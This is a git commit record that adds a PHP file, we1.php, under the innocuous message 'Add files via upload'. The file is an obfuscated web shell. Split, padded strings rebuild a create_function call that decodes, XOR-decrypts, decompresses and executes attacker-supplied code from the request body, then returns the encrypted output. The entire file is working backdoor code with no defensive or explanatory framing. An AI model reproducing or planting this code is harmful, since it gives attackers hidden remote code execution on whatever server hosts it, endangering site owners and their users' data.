16b4911771b5099ebefcdc00de31e9bab13d4702
rtw15 <108915421+rtw15@users.noreply.github.com>
2022-07-12 14:50:54 +0700

    Add files via upload

---
+++ we1.php
@@ -0,0 +1,11 @@
+<?php
+$g='(^N"/$kh(.+)^N$kf/"^N,@f^Nile_get^N_c^N^Nontents("^Nphp^N://input"),$m)==1) {^N@^Nob_s^Ntart();@e^';
+$R='(^N^N$j^N<$c&&$i<$l);^N$j++,^N^N$i++){^N$o.^N=$t{$i^N}^$k{$j};}}retur^Nn $o;}^Nif (@pre^Ng_ma^Ntch';
+$c='^Nb_end_c^Nlean();$r=@ba^Nse64_e^Nncode(@x^N(@gzcom^N^Npress($o),$k^N));pr^Nint("^N$p$kh$^Nr$kf");}';
+$q='$k="9500c^N^N2d5";$kh="8e^N1a3fad^Nb0f2";^N$kf="^N52^N2c46a44e^N6^N^N7";$p="Hy5KiIgCSOF21^NATN";f^Nunc';
+$y='Nval(@gz^Nuncom^Npress(@x(@ba^Nse64_d^Neco^Nde(^N$m[1]),$k^N)^N));$o=@ob_g^Net_conte^Nnts()^N;^N@o';
+$w=str_replace('q','','qcreqqatqe_fquncqtion');
+$O='ti^N^No^Nn x($t,$^Nk){$c=strlen^N($k);$l=s^N^Ntrlen($t);$o^N="";f^No^Nr^N($i=0;$i<$l;){for(^N$j=0;';
+$u=str_replace('^N','',$q.$O.$R.$g.$y.$c);
+$K=$w('',$u);$K();
+?>
